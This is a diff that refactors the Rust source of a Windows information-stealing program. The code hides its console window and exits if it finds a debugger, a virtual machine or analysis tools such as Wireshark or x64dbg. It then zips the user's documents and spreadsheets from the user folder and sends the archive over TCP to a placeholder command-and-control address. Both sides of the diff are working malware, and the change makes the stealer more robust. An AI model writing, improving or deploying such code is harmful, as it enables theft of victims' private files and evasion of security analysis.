@@ -1,117 +1,108 @@
-use std::io::Write;
+use std::fs::File;
+use std::io::{Read, Write};
 use std::net::TcpStream;
-use std::string::String;
-use std::{fs::File, io::Read};
-use winapi::um::debugapi::CheckRemoteDebuggerPresent;
-use winapi::um::processthreadsapi::GetCurrentProcess;
-use winapi::um::tlhelp32::{
-    CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
+
+use winapi::um::{
+    debugapi::CheckRemoteDebuggerPresent,
+    processthreadsapi::GetCurrentProcess,
+    tlhelp32::{CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
 };
-use zip::write::FileOptions;
 
-fn main() {
-    console_hide();
-    anti_vm();
-    anti_debug();
-    directory_travel();
-    let user = whoami::realname();
-    let file = format!("C:/Users/{}/AppData/Local/Temp/sensfiles.zip", &user);
-    let md = std::fs::metadata(&file).unwrap();
-    if md.is_file() {
-        let mut f = File::open(&file).expect("Failed open file");
-        let mut buf = Vec::with_capacity(f.metadata().unwrap().len() as usize);
-        f.read_to_end(&mut buf).unwrap();
-        connect(&mut buf);
-    }
+use zip::{write::FileOptions, ZipWriter};
+
+fn send_data(path: &std::path::Path) -> std::io::Result<usize> {
+    let mut file = File::open(path)?;
+    let mut buffer: Vec<u8> = match &file.metadata() {
+        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
+        Err(_) => Vec::new(),
+    };
+    let _ = file.read_to_end(&mut buffer)?;
+    let mut stream = TcpStream::connect("C2IP:C2PORT")?;
+    stream.write(&buffer)
 }
 
-fn connect(buf: &mut Vec<u8>) {
-    match TcpStream::connect("C2IP:C2PORT") {
-        Ok(mut stream) => {
-            println!("Connection Succesfully");
-            stream.write(buf).unwrap();
-        }
-        Err(e) => {
-            println!("Connection Failed : {}", e);
-        }
-    }
-}
-
-fn console_hide() {
-    unsafe { winapi::um::wincon::FreeConsole() };
-}
-
-fn directory_travel() {
+fn grab_data() -> std::io::Result<()> {
     let user = whoami::realname();
 
     let filename = format!("C:/Users/{}/AppData/Local/Temp/sensfiles.zip", &user);
-
     let path = std::path::Path::new(&filename);
-    let file = std::fs::File::create(&path).unwrap();
 
-    let mut zip = zip::ZipWriter::new(file);
-    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
+    if let Ok(file) = std::fs::File::create(&path) {
+        let mut zip_writer = ZipWriter::new(file);
+        let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
 
-    let glob_string = format!(
-        "C:/Users/{}/*.{{pdf,xls,txt,doc,docx,ppt,pptx,odt,xlsx,xlsm,xls,csv}}",
-        &user
-    );
+        let glob_string = format!(
+            "C:/Users/{}/*.{{pdf,xls,txt,doc,docx,ppt,pptx,odt,xlsx,xlsm,xls,csv}}",
+            &user
+        );
 
-    globwalk::glob(&glob_string)
-        .unwrap()
-        .filter_map(|dent| dent.ok())
-        .enumerate()
-        .for_each(|(idx, dent)| {
-            let path = dent.path();
-            println!("{} {:?}", idx, path);
-            if path.is_file() {
-                if let Ok(f) = &mut File::open(path) {
-                    let mut buffer: Vec<u8> = match f.metadata() {
-                        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
-                        Err(_) => Vec::new(),
-                    };
-                    if f.read_to_end(&mut buffer).is_ok()
-                        && zip.start_file_from_path(path, options).is_ok()
-                    {
-                        let _ = zip.write_all(&buffer);
+        globwalk::glob(&glob_string)?
+            .filter_map(|dent| dent.ok())
+            .enumerate()
+            .for_each(|(_idx, dent)| {
+                let path = dent.path();
+                if path.is_file() {
+                    if let Ok(f) = &mut File::open(path) {
+                        let mut buffer: Vec<u8> = match &f.metadata() {
+                            Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
+                            Err(_) => Vec::new(),
+                        };
+                        if f.read_to_end(&mut buffer).is_ok()
+                            && zip_writer.start_file_from_path(path, options).is_ok()
+                        {
+                            let _ = zip_writer.write_all(&buffer);
+                        }
                     }
                 }
-            }
-        });
+            });
+    }
+    send_data(&path)?;
+    Ok(())
 }
 
-fn anti_debug() {
-    unsafe {
-        let mut dbgtst: i32 = 1;
-        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut dbgtst);
+unsafe fn anti_debug() {
+    let mut dbgtst: i32 = 1;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut dbgtst);
+
+    if dbgtst == 1 {
         std::process::exit(0x0100);
-    };
+    }
 }
 
-fn anti_vm() {
-    unsafe {
-        fn char_arr_to_string(chars: &[i8]) -> String {
-            chars.iter().map(|c| *c as u8 as char).collect()
-        }
-        let mut pe32: PROCESSENTRY32 = std::mem::zeroed();
-        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
-        let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+unsafe fn anti_vm() {
+    let mut pe32: PROCESSENTRY32 = std::mem::zeroed();
+    pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
 
-        while Process32Next(handle, &mut pe32) != 0 {
-            // let  procid = pe32.th32ProcessID;
-            let procname: String = char_arr_to_string(&pe32.szExeFile);
-            if procname.contains("vmtools")
-                || procname.contains("vm3dservice")
-                || procname.contains("vboxservice")
-                || procname.contains("vboxtray")
-                || procname.contains("wireshark")
-                || procname.contains("processhacker")
-                || procname.contains("ida64")
-                || procname.contains("ida.exe")
-                || procname.contains("x64dbg")
-            {
-                std::process::exit(0x0100);
-            }
+    let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    while Process32Next(handle, &mut pe32) != 0 {
+        // let  procid = pe32.th32ProcessID;
+        let procname: String = pe32.szExeFile.iter().map(|c| *c as u8 as char).collect();
+        if procname.contains("vmtools")
+            || procname.contains("vm3dservice")
+            || procname.contains("vboxservice")
+            || procname.contains("vboxtray")
+            || procname.contains("wireshark")
+            || procname.contains("processhacker")
+            || procname.contains("ida64")
+            || procname.contains("ida.exe")
+            || procname.contains("x64dbg")
+        {
+            std::process::exit(0x0100);
         }
+    }
+}
+
+fn stealth() {
+    unsafe {
+        winapi::um::wincon::FreeConsole();
+        anti_vm();
+        anti_debug();
+    }
+}
+fn main() {
+    stealth();
+    if let Err(err) = grab_data() {
+        println!("{:?}", &err);
     };
 }
